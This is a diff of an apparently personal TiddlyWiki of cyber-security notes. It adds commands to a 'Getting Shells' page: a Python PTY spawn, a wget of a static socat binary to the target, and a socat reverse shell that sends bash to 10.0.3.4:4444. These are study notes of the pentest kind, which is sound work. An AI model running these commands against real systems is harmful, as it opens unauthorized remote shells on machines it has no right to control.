@@ -9638,7 +9638,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20210913120352501" list="$:/ControlPanel CrappyMakerProgrammer Tech [[Cyber Security]] [[Draft of 'Privilege Escalation']] LinEnum" modified="20210913120413496" title="$:/StoryList">
+<div created="20210913120352501" list="CrappyMakerProgrammer Tech [[Cyber Security]] [[Getting Shells]] [[Draft of 'Privilege Escalation']] LinEnum" modified="20210913120448416" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -10649,7 +10649,7 @@ Most popular Game Engines
 
 </pre>
 </div>
-<div created="20210901154708454" modified="20210904113123515" title="Getting Shells">
+<div created="20210901154708454" modified="20210913120816020" title="Getting Shells">
 <pre>! Reverse Shell
 
 !! Payloads 
@@ -10678,7 +10678,14 @@ To upgrade a bash shell to a meterpreter shell, can
 # Background the Session by Ctrl Z
 # Run `sessions -u &lt;session_id&gt;` to upgrade it to a meterpreter shell
 
-Some more ways are available [[here|https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/]]</pre>
+Some more ways are available [[here|https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/]]
+
+# Python 
+## `python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'`
+# socat
+## Download Binary from `wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat` to remote server
+## Listener on Client: `socat file:`tty`,raw,echo=0 tcp-listen:4444`
+## Target: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 `</pre>
 </div>
 <div created="20210820234654216" modified="20210827061258698" title="Ghost">
 <pre>! Setup
